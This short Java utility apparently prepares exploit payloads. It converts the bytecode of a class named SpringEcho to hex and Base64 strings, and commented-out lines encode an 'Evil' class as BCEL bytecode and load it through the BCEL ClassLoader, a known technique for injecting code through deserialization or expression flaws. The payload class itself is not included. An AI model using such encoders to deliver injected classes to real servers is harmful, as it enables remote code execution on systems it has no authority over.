import com.example.spring.spring.SpringEcho;
import com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;
import javassist.ClassPool;
import org.springframework.util.Base64Utils;

import java.util.Base64;

class ToEncode {
    public static void main(String[] argv) throws Exception {
        //转换为字节码并编码为bcel字节码
//        JavaClass cls = Repository.lookupClass(Evil.class);
//        String code = Utility.encode(cls.getBytes(), true);
//        System.out.println("$$BCEL$$" + code);
//
//        com.sun.org.apache.bcel.internal.util.ClassLoader.class.newInstance().loadClass("$$BCEL$$"+code).newInstance();
        //注意package
        byte[] bytes = ClassPool.getDefault().get(SpringEcho.class.getName()).toBytecode();
        String payload = Base64.getEncoder().encodeToString(bytes);
        String safe_payload = Base64Utils.encodeToUrlSafeString(bytes);
        System.out.println(HexBin.encode(bytes));
        System.out.println(payload);
    }
}

